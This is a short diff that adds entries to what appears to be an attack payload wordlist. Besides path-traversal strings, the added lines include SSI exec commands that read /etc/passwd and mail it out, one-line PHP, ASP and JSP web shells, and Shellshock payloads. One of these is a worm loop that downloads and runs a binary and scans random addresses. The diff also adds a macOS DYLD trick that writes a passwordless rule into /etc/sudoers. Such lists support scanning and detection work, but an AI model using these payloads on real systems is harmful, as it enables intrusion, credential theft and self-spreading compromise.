@@ -314,3 +314,19 @@ FAIL||CMD=$"{cmd}";$CMD
 /.../.../.../.../.../
 ..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+<!--#exec cmd="/bin/ls /" --><br/>
+<!--#exec cmd="cat /etc/passwd" --><br/>
+<!--#exec cmd="find / -name . -print" --><br/>
+<!--#exec cmd="mail Florian Roth @4nc4p <mailto:Florian Roth @4nc4p> < cat /etc/passwd" --><br/>
+<% eval request("cmd") %> 
+<?php system($_GET["cmd"]) ?> 
+<% Runtime.getruntime().exec(request.getParameter("cmd")) %>
+() {<svg onload="alert(1)"> {')' "(</svg>" {& }; echo -e "header\x3axss
+env x='() { :;}; apt-get update && apt-get install --only-upgrade bash' bash -c "Oops."
+s='() { .;};wget x.x.x.x/WORM;chmod +x WORM;./WORM';while true;do wget $[RANDOM%255].$[RANDOM%255].$[RANDOM%255].$[RANDOM%255] -U'$s';done
+env 'x=() { :;}; echo vulnerable' 'BASH_FUNC_x()=() { :;}; echo vulnerable' bash -c "echo test"
+foo='() { echo "hi mom"; }' bash -c 'foo'
+Cookie: () { echo "Hello world"; }
+() { :;}; /bin/bash -c \"wget http://a.b.c.d/bash-count.txt\"
+echo python -c '"import os;os.write(3,\"ALL ALL=(ALL) NOPASSWD: ALL\")"'|DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;sudo su
+strings /usr/lib/dyld | grep ^DYLD_ | sed -e 's/^/note to self: try exploiting /'
